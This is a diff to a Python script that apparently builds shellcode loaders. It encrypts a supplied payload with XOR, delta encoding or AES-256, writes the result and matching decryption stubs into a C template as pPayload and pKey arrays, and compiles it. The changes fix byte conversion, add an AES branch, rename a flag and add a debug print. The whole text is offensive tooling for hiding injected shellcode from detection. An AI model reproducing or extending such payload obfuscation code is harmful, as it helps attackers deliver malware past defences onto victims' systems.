@@ -98,15 +98,24 @@ def writePayload(shellcode, blob):
 	for line in mainLines:
 
 		# Update payload line
-		if "BYTE pPayload[]" in line and args.xor:
+		if "BYTE pPayload[]" in line and args.xor: ## XOR
 			line = "\tBYTE pPayload[] = { "
 			for j in range(0,len(shellcode)):
 				if j != len(shellcode)-1:
-					line += f"0x{shellcode[j].to_bytes(1).hex()}, "
+					line += f"0x{shellcode[j].to_bytes(1,byteorder='big').hex()}, "
 				else:
-					line += f"0x{shellcode[j].to_bytes(1).hex()}" + " };\n"
-		elif "BYTE pPayload[]" in line and args.delta:
+					line += f"0x{shellcode[j].to_bytes(1,byteorder='big').hex()}" + " };\n"
+
+		elif "BYTE pPayload[]" in line and args.delta: ## Delta Encoding
 			line = "\n"
+
+		elif "BYTE pPayload[]" in line: ## Default - AES 
+			line = "\tBYTE pPayload[] = { "
+			for j in range(0,len(shellcode)):
+				if j != len(shellcode)-1:
+					line += f"0x{shellcode[j].hex()}, "
+				else:
+					line += f"0x{shellcode[j].hex()}" + " };\n"
 		
 		# Update size line
 		if "SIZE_T sPayloadSize" in line:
@@ -180,7 +189,7 @@ def encryptXOR(shellcode):
 	encrypted = bytes(a ^ b for a, b in zip(byteString, cycle(key)))
 	encList = []
 	for byte in encrypted:
-		encList.append(byte.to_bytes(1))
+		encList.append(byte.to_bytes(1,byteorder='big'))
 
 	return encrypted, key
 
@@ -190,9 +199,9 @@ def xorBlob(key):
 	keyLine = "\tBYTE pKey[] = { "
 	for i in range(0,len(key)):
 		if i != len(key)-1:
-			keyLine += f"0x{key[i].to_bytes(1).hex()}, "
+			keyLine += f"0x{key[i].to_bytes(1,byteorder='big').hex()}, "
 		else:
-			keyLine += f"0x{key[i].to_bytes(1).hex()} " + "};\n"
+			keyLine += f"0x{key[i].to_bytes(1,byteorder='big').hex()} " + "};\n"
 
 	blob = keyLine + f"""
 	for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {{
@@ -238,10 +247,11 @@ def main():
 	elif args.delta: # DELTA
 		offset_arr,raw_sc,sc_len = encryptDelta(shellcode)
 		writePayload(shellcode, deltaBlob(offset_arr,raw_sc,sc_len))
-	elif args.dont: # DON'T ENCRYPT
+	elif args.dont_encrypt: # DON'T ENCRYPT
 		writePayload(shellcode, None)
 	else: # DEFAULT - AES-256
 		shellcode, key, iv = encryptAES(shellcode)
+		print(shellcode)
 		writePayload(shellcode, aesBlob(key,iv))
 
 	#### Compile
